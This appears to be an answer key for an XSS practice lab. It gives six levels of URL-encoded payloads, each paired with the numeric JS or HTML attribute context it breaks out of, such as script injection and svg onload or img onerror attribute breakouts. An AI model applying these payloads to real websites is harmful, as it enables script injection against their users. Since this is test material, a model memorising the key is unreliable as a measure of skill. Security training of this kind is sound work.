# numericcontext — solutions

Reflections in numeric-only positions (JS numbers, CSS/HTML numeric attributes).

### numericcontext-level1

`/numericcontext/level1/?query=1%3Balert(1)`

- payload: `1;alert(1)`
- context: var count = QUERY; unquoted JS numeric

### numericcontext-level2

`/numericcontext/level2/?query=1%22%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `1"><svg onload=alert(1)>`
- context: style="z-index: QUERY" double-quoted attr breakout

### numericcontext-level3

`/numericcontext/level3/?query=100%22%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `100"><svg onload=alert(1)>`
- context: <input max="QUERY"> attribute breakout

### numericcontext-level4

`/numericcontext/level4/?query=1%22%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `1"><svg onload=alert(1)>`
- context: <table border="QUERY"> attribute breakout

### numericcontext-level5

`/numericcontext/level5/?query=200%22%20onerror%3Dalert(1)%20src%3Dx%20x%3D%22`

- payload: `200" onerror=alert(1) src=x x="`
- context: <img width="QUERY" src="photo.jpg"> attribute breakout adds onerror

### numericcontext-level6

`/numericcontext/level6/?query=1000)%3Balert(1)%3B(`

- payload: `1000);alert(1);(`
- context: setTimeout(function(){}, QUERY); unquoted JS numeric
